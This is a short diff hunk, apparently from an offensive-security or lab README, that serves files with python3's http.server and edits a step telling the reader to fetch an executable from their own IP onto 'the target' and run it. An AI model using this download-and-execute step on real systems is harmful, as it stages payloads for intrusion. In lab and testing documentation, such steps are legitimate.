@@ -116,7 +116,7 @@ Or:
 python3 -m http.server <PORT>
 ```
 
-Then fetch `http://<your-ip>/netmon.exe` on the target and run it.
+Then fetch `http://<your-ip>/<whatEverYouWant>.exe` on the target and run it.
 
 ---
 
